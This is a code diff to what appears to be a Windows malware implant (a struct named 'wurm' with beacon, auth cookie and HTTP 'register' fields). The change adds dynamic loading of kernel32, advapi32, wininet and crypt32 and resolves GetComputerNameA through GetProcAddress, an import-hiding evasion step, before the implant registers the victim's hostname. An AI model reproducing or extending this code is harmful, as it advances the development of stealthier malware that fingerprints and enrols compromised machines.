@@ -4,6 +4,11 @@
 
 #define pointer_length 1
 
+typedef BOOL (WINAPI* GETCOMPUTERNAMEA)(
+    LPSTR lpBuffer,
+    LPDWORD nSize
+);
+
 struct {
     struct {
         char            hostname[MAX_PATH];
@@ -32,6 +37,20 @@ struct {
         int             count;
     } beacon;
 } wurm;
+
+struct {
+    struct {
+        struct {
+            GETCOMPUTERNAMEA    GetComputerNameA;
+        } call;
+        struct {
+            HMODULE             kernel32;
+            HMODULE             advapi32;
+            HMODULE             crypt32;
+            HMODULE             wininet;
+        } module;
+    } win32;
+} internal;
 
 unsigned char patch_list_name[pointer_length] = {0xAA};
 
@@ -63,7 +82,7 @@ void Register() {
     wurm.http.status = "register";
     wurm.http.format = "%s:%s,%s,%d,%d,%s";
 
-    if (GetComputerNameA(wurm.info.hostname, &hostname_length)) {
+    if (internal.win32.call.GetComputerNameA(wurm.info.hostname, &hostname_length)) {
         printf("Hostname: %s\n", wurm.info.hostname);
     }
 
@@ -244,6 +263,13 @@ int main(int argc, char* argv[]) {
 
     wurm.auth.cookie = NULL; 
     wurm.auth.keyword = "boondoggle";
+
+    internal.win32.module.kernel32 = LoadLibraryA("kernel32.dll");
+    internal.win32.module.advapi32 = LoadLibraryA("advapi32.dll");
+    internal.win32.module.wininet = LoadLibraryA("wininet.dll");
+    internal.win32.module.crypt32 = LoadLibraryA("crypt32.dll");
+
+    internal.win32.call.GetComputerNameA = (GETCOMPUTERNAMEA) GetProcAddress(internal.win32.module.kernel32, "GetComputerNameA");
 
     Register();
 
